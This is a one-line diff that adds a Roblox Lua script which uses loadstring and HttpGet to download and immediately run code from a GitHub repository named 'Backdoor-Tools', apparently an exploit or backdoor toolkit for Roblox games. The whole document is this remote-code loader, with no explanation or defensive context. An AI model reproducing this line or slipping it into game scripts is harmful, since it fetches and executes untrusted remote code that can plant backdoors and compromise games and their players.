@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Obunga-666/Backdoor-Tools/refs/heads/main/Backdoor%20Tools"))() 
